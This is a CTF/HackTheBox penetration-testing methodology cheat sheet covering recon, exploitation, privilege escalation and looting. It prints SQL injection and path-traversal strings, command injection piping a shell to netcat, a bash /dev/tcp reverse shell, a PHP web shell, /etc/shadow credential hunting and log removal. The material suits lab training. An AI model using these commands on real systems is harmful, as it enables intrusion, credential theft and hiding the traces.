---
description: HackTheBox flowchart-style methodology
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# HTB/CTF Methodology

### Preamble **Flowchart Structure**

* Each section should be followed **sequentially**, but **loop back** when necessary (e.g., if privilege escalation fails, redo enumeration)
* The **faster you enumerate**, the faster you pwn!
* **CTF-style mindset:** If one method isn’t working, try another attack vector!
* Keep **automation + manual balance**: Don’t blindly run scripts, think like an attacker!

***

### [**1.  Initial Recon (Information Gathering)**](enumeration-recon/)

#### **1.1 - Basic Enumeration (Nmap)**

* `nmap -sSVC -oN initial_scan.txt <IP>`
* If firewalls suspected: `nmap -Pn -sV -O -oN aggressive_scan.txt <IP>`
* UDP scan if needed: `nmap -sU -oN udp_scan.txt <IP>`
* UDP scan for top 100 ports: `nmap -sU --top-ports 100 <IP>`
* **Key Takeaways:** Open ports, running services, potential vulnerabilities

#### **1.2 - Web Recon (If HTTP/HTTPS is Open)**

* **Directory fuzzing:** `ffuf -u http://example.com/FUZZ -w <WORDLIST> -ac`
* **Subdomain fuzzing:** `ffuf -u http://example.com/ -w <WORDLIST> -H "Host: FUZZ.example.com" -ac`
* **Check for juicy files:** `robots.txt`, `.git/`, `.env`, `.DS_Store`, `backup.zip`
* **CMS detection:** `whatweb <URL>` or `wpscan --url <URL> --enumerate`
* **Test for LFI/RFI, SQLi, SSTI, XSS manually**

#### **1.3 -** [**SMB**](enumeration-recon/active-directory.md)**, FTP, and Other Services**

* **SMB Shares:** `smbclient -L //<IP>` → `smbmap -H <IP>`
* **FTP:** Anonymous login? Check for writable directories.
* **SNMP:** `snmpwalk -v 2c -c public <IP>` (leaks usernames!)
* **Check for misconfigurations, default creds, exploits**

### **2. Exploitation & Shell Access**

#### **2.1 - Search for Exploits**

* `searchsploit <service>`
* Google: " version exploit"
* `nuclei -t cves/ -u http://<IP>`
* Check GitHub & Exploit-DB for PoCs

#### **2.2 - Manual Exploitation**

* **SQL Injection** (Try `' OR 1=1 --` or `sqlmap -u "http://<IP>/login.php?user=admin" --dump`)
* **LFI/RFI:** `../../../../etc/passwd` or `curl http://<IP>/page.php?file=../../../../etc/passwd`
* **Command Injection:** `; whoami`, `$(id)`, `| nc <your_IP> <port> -e /bin/bash`

#### **2.3 - Reverse Shells & Web Shells -** [**https://www.revshells.com/**](https://www.revshells.com/)

* Netcat: `nc -lvnp 4444` → Target: `bash -i >& /dev/tcp/<your_IP>/4444 0>&1`
* PHP shell: `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
* **Stabilize shell:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`
* Upgrade: `stty raw -echo; fg; reset`

### [**3. Privilege Escalation**](privilege-escalation/)

#### **3.1 - Enumerate for Privesc**

* `whoami && id && hostname`
* `sudo -l` (check for sudo misconfigurations)
* `find / -perm -u=s -type f 2>/dev/null` (SUID binaries)
* `env | grep PATH` (Path hijacking?)
* `ls -lah /home/* /root/` (sensitive files)
* **Automated:** `linpeas.sh`, `linux-smart-enumeration.sh`, `winPEAS.exe`

#### **3.2 - Privilege Escalation Techniques**

* **Sudo misconfigs:** `sudo /bin/bash` or `sudoedit /etc/passwd`
* **SUID binaries:** `./exploit` with elevated privileges
* **Cron jobs & writable scripts:** Replace with reverse shell payload
* **Kernel exploits:** Use `uname -a` → Search for matching exploits
* **Password reuse:** Check `.bash_history`, `/etc/shadow`, and MySQL creds

### **4. Post-Exploitation & Looting**

#### **4.1 - Finding Flags**

* **HTB format:** `user.txt` (in home dir), `root.txt` (in `/root/`)
* Check **hidden directories**, logs, and running processes

#### **4.2 - Pivoting & Lateral Movement**

* If you found SSH keys: `ssh -i id_rsa user@<IP>`
* If there’s another user: `su <user>` with found passwords
* Check for **internal network access:** `ifconfig`, `netstat -tulnp`

### **5. Cleanup & Write-Up**

#### **5.1 - Notes & Report**

* Document **every step, command, and exploit used**
* Take screenshots of flags and interesting findings
* Write a **personalized exploit workflow** for future reference

#### **5.2 - Cleanup (If Necessary)**

* Remove reverse shells, exploits, and logs you created
* Reset permissions if modified
